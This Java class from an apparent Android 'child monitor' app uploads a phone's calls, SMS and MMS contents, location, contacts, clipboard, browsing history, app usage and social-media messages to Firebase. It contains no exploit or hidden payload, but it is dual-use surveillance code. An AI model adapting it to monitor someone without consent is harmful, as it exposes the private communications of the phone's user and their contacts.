package com.childmonitorai;
import com.childmonitorai.models.CallData;
import com.childmonitorai.models.ClipboardData;
import com.childmonitorai.models.ContactData;
import com.childmonitorai.models.MessageData;
import com.childmonitorai.models.MMSData;
import com.childmonitorai.models.SMSData;
import com.childmonitorai.models.WebVisitData;
import com.childmonitorai.models.AppUsageData;




import static android.content.ContentValues.TAG;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.android.gms.tasks.Task;
import java.util.Date;
import java.util.Locale;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

public class DatabaseHelper {

    private static DatabaseReference database;

    public DatabaseHelper() {
        // Firebase initialization
        database = FirebaseDatabase.getInstance().getReference("users");
    }

    // Helper method to avoid repetition of paths
    private static DatabaseReference getPhoneDataReference(String userId, String phoneModel, String dataType, String uniqueId, String date) {
        return database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child(dataType)
                .child(date)
                .child(uniqueId);
    }

    // Upload all call data grouped by date and check for duplication of recent data only
    public void uploadCallDataByDate(String userId, String phoneModel, CallData callData, String uniqueCallId, String callDate) {
        DatabaseReference callRef = getPhoneDataReference(userId, phoneModel, "calls", uniqueCallId, callDate);

        callRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> callMap = new HashMap<>();
                callMap.put("date", callData.getDate());
                callMap.put("duration", callData.getCallDuration());
                callMap.put("number", callData.getPhoneNumber());
                callMap.put("type", callData.getCallType());
                callMap.put("timestamp", callData.getTimestamp());
                callMap.put("contactName", callData.getContactName()); // Include contact name

                callRef.setValue(callMap).addOnSuccessListener(aVoid ->
                                Log.d("DatabaseHelper", "Call data uploaded successfully."))
                        .addOnFailureListener(e ->
                                Log.e("DatabaseHelper", "Failed to upload call data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate call data found for recent call, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    // Upload all SMS data grouped by date and check for duplication of recent SMS only
    public void uploadSMSDataByDate(String userId, String phoneModel, SMSData smsData, String uniqueSMSId, String smsDate) {
        DatabaseReference smsRef = getPhoneDataReference(userId, phoneModel, "sms", uniqueSMSId, smsDate);

        smsRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> smsMap = new HashMap<>();
                smsMap.put("type", smsData.getType());
                smsMap.put("address", smsData.getAddress());
                smsMap.put("body", smsData.getBody());
                smsMap.put("timestamp", smsData.getTimestamp());
                smsMap.put("date", smsData.getDate());
                smsMap.put("contactName", smsData.getContactName()); // Include contact name

                smsRef.setValue(smsMap).addOnSuccessListener(aVoid ->
                                Log.d("DatabaseHelper", "SMS data uploaded successfully."))
                        .addOnFailureListener(e ->
                                Log.e("DatabaseHelper", "Failed to upload SMS data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate SMS data found for recent SMS, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error accessing Firebase: " + e.getMessage()));
    }

    // Upload MMS data grouped by date
    public void uploadMMSDataByDate(String userId, String phoneModel, MMSData mmsData, String uniqueMMSId, String mmsDate) {
        DatabaseReference mmsRef = getPhoneDataReference(userId, phoneModel, "mms", uniqueMMSId, mmsDate);

        mmsRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> mmsMap = new HashMap<>();
                mmsMap.put("subject", mmsData.getSubject());
                mmsMap.put("date", mmsData.getDate());
                mmsMap.put("senderAddress", mmsData.getSenderAddress());
                mmsMap.put("content", mmsData.getContent());

                mmsRef.setValue(mmsMap).addOnSuccessListener(aVoid ->
                                Log.d("DatabaseHelper", "MMS data uploaded successfully."))
                        .addOnFailureListener(e ->
                                Log.e("DatabaseHelper", "Failed to upload MMS data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate MMS data found for recent MMS, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    // Upload location data
    public void uploadLocationDataByDate(String userId, String phoneModel, Map<String, Object> locationData, String uniqueLocationId, String locationDate) {
        String sanitizedLocationId = sanitizePath(uniqueLocationId);
        DatabaseReference locationRef = getPhoneDataReference(userId, phoneModel, "location", sanitizedLocationId, locationDate);

        // Fetch existing data to avoid duplicates
        locationRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                // If no existing data, create the data map and upload
                locationRef.setValue(locationData)
                        .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Location data uploaded successfully."))
                        .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload location data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate location data found for the same date, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error accessing Firebase: " + e.getMessage()));
    }

    // Upload contact data
    public void uploadContactData(String userId, String phoneModel, ContactData contactData, String uniqueContactId) {
        DatabaseReference contactRef = getPhoneDataReference(userId, phoneModel, "contacts", uniqueContactId, "");

        contactRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && task.getResult().exists()) {
                // Contact exists, meaning it's an update
                ContactData existingContact = task.getResult().getValue(ContactData.class);
                if (existingContact != null) {
                    // Set the original name before modification
                    contactData.setNameBeforeModification(existingContact.getName());
                }
                // Update the last modified time
                contactData.setLastModifiedTime(System.currentTimeMillis());
            } else {
                // It's a new contact, so set the creation time
                contactData.setCreationTime(System.currentTimeMillis());
            }

            // Upload the contact data with the appropriate timestamps
            contactRef.setValue(contactData)
                    .addOnCompleteListener(uploadTask -> {
                        if (uploadTask.isSuccessful()) {
                            Log.d("DatabaseHelper", "Contact data uploaded successfully.");
                        } else {
                            Log.e("DatabaseHelper", "Error uploading contact data: " + uploadTask.getException().getMessage());
                        }
                    });
        });
    }

    // Upload app data
    public void uploadAppData(String userId, String phoneModel, String uniqueKey, Map<String, Object> appMap) {
        DatabaseReference appRef = getPhoneDataReference(userId, phoneModel, "apps", uniqueKey, "");

        appRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                appRef.setValue(appMap).addOnSuccessListener(aVoid ->
                                Log.d("DatabaseHelper", "App data uploaded successfully."))
                        .addOnFailureListener(e ->
                                Log.e("DatabaseHelper", "Failed to upload app data: " + e.getMessage()));
            } 
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    public Task<Void> uploadWebVisitDataByDate(String userId, String phoneModel, WebVisitData visitData) {
        // Use the standard path structure: users/{userId}/phones/{phoneModel}/web_visits/{date}
        DatabaseReference dbRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("web_visits")
                .child(visitData.getDate());

        if (visitData.getDatabaseKey() == null) {
            String key = dbRef.push().getKey();
            visitData.setDatabaseKey(key);
            return dbRef.child(key).setValue(visitData);
        } else {
            return dbRef.child(visitData.getDatabaseKey()).setValue(visitData);
        }
    }

    public void uploadAppUsageDataByDate(String userId, String phoneModel, AppUsageData appUsageData) {
        if (appUsageData.getUsageDuration() == 0 && appUsageData.getLaunchCount() == 0) {
            return; // Skip if no usage data
        }

        String sanitizedPackageName = sanitizePath(appUsageData.getPackageName());
        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());

        DatabaseReference usageRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("app_usage")
                .child(date)
                .child(sanitizedPackageName);

        Map<String, Object> usageMap = new HashMap<>();
        usageMap.put("package_name", appUsageData.getPackageName());
        usageMap.put("app_name", appUsageData.getAppName());
        usageMap.put("usage_duration", appUsageData.getUsageDuration());
        usageMap.put("launch_count", appUsageData.getLaunchCount());
        usageMap.put("last_used", appUsageData.getLastTimeUsed());
        usageMap.put("timestamp", System.currentTimeMillis());

        // First check if there's existing data for today
        usageRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                Map<String, Object> existingData = (Map<String, Object>) task.getResult().getValue();
                if (existingData != null) {
                    // Accumulate usage data
                    long existingDuration = (long) existingData.get("usage_duration");
                    long existingLaunches = (long) existingData.get("launch_count");
                    usageMap.put("usage_duration", existingDuration + appUsageData.getUsageDuration());
                    usageMap.put("launch_count", existingLaunches + appUsageData.getLaunchCount());
                }
                
                // Upload updated data
                usageRef.setValue(usageMap)
                        .addOnSuccessListener(aVoid -> 
                            Log.d(TAG, "Successfully uploaded usage data for " + appUsageData.getPackageName()))
                        .addOnFailureListener(e -> 
                            Log.e(TAG, "Failed to upload usage data: " + e.getMessage()));
            }
        });
    }

    public static void uploadClipboardDataByDate(String userId, String phoneModel, ClipboardData clipboardData) {
        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
        DatabaseReference ref = FirebaseDatabase.getInstance().getReference("users")
                .child(userId)
                .child("phones")
                .child(phoneModel)
                .child("clipboard")
                .child(date);

        String key = ref.push().getKey();
        if (key != null) {
            // Create a map for the clipboard data to be uploaded
            Map<String, Object> clipboardMap = new HashMap<>();
            clipboardMap.put("content", clipboardData.getContent());
            clipboardMap.put("timestamp", clipboardData.getTimestamp());

            // Upload the clipboard data to Firebase
            ref.child(key).setValue(clipboardMap)
                    .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Clipboard data uploaded successfully."))
                    .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload clipboard data: " + e.getMessage()));
        } else {
            Log.e("DatabaseHelper", "Failed to generate database key");
        }
    }

    public void uploadSocialMessageData(String userId, String phoneModel, MessageData messageData, String uniqueMessageId, String messageDate, String platform) {
        // Adjusting the call to getPhoneDataReference to match the expected number of arguments
        DatabaseReference messageRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("social_media_messages")
                .child(messageDate) // Group by date
                .child(platform) // Group by platform
                .child(uniqueMessageId); // Use unique ID for each message

        messageRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> messageMap = new HashMap<>();
                messageMap.put("sender", messageData.getSender());
                messageMap.put("receiver", messageData.getReceiver());
                messageMap.put("message", messageData.getMessage());
                messageMap.put("timestamp", messageData.getTimestamp());
                messageMap.put("direction", messageData.getDirection());
                messageMap.put("platform", platform);

                // Set the value under the social_media_messages node
                messageRef.setValue(messageMap).addOnSuccessListener(aVoid -> {
                            Log.d("DatabaseHelper", platform + " message data uploaded successfully.");
                        })
                        .addOnFailureListener(e -> {
                            Log.e("DatabaseHelper", "Failed to upload " + platform + " message data: " + e.getMessage());
                        });
            } else {
                Log.d("DatabaseHelper", "Duplicate " + platform + " message data found, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }



    // Helper function to sanitize paths and remove invalid characters
    String sanitizePath(String originalPath) {
        if (originalPath == null) return "";
        
        // Replace any character that's not alphanumeric, underscore, or hyphen
        String sanitized = originalPath.replaceAll("[^a-zA-Z0-9_-]", "_");
        
        // Ensure the path doesn't start with a number (Firebase requirement)
        if (sanitized.matches("^[0-9].*")) {
            sanitized = "_" + sanitized;
        }
        
        // Prevent empty strings
        if (sanitized.isEmpty()) {
            sanitized = "_empty_";
        }
        
        return sanitized;
    }
}
